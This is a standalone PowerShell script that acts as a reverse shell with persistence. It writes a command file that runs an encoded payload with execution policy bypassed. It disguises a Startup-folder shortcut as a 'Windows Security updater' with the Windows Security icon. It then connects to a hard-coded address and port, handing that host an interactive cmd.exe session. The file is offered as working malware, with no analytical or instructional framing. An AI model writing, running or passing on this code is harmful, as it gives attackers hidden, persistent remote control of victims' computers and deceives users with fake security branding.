function cleanup {
    if ($client.Connected -eq $true) {$client.Close()}
    if ($process.ExitCode -ne $null) {$process.Close()}
    exit}

    $exploit = [Environment]::GetFolderPath('user')+"\Contacts\Windows Security updater.cmd";
    $shortcutPath = [Environment]::GetFolderPath('Startup')+"\Windows Security updater.lnk";
    $cmd = [Environment]::GetFolderPath('system')+"\cmd.exe";

   
    write "powershell.exe -exec bypass -enc $basePayload" | Out-File -filepath $exploit -Force -Encoding ascii;
    $WshShell = New-Object -comObject WScript.Shell;
    $Shortcut = $WshShell.CreateShortcut($shortcutPath);
    $Shortcut.TargetPath = $exploit;
    $shortcut.IconLocation="SecurityHealthSystray.exe, 0";
    $shortcut.Description="Windows Security updater";
    $Shortcut.Save();

    $address = '192.168.0.10'
    $port = '12345'

    $client = New-Object system.net.sockets.tcpclient
    DO
    {


        if (Get-Variable 'process' -Scope 'Global' -ErrorAction 'Ignore') {
            if ($process.ExitCode -ne $null) {$process.Close()}
        }

        $client.connect($address,$port)

    } While ($client.Connected -ne $true)

    $stream = $client.GetStream()
    $networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.FileName = $cmd
    $process.StartInfo.RedirectStandardInput = 1
    $process.StartInfo.RedirectStandardOutput = 1
    $process.StartInfo.UseShellExecute = 0
    $process.Start()
    $inputstream = $process.StandardInput
    $outputstream = $process.StandardOutput
    Start-Sleep 1
    $encoding = new-object System.Text.AsciiEncoding
    while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
    $stream.Write($encoding.GetBytes($out),0,$out.Length)
    start-sleep 10

    $out = $null; $done = $false; $testing = 0;
    while (-not $done) {
    if ($client.Connected -ne $true) {cleanup}
    $pos = 0; $i = 1
    while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
    $read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
    $pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
    if ($pos -gt 0) {
    $string = $encoding.GetString($networkbuffer,0,$pos)
    $inputstream.write($string)
    start-sleep 1
    if ($process.ExitCode -ne $null) {cleanup}
    else {
    $out = $encoding.GetString($outputstream.Read())
    while($outputstream.Peek() -ne -1){
    $out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
    $stream.Write($encoding.GetBytes($out),0,$out.length)
    $out = $null
    $string = $null}} else {cleanup}}

    cleanup
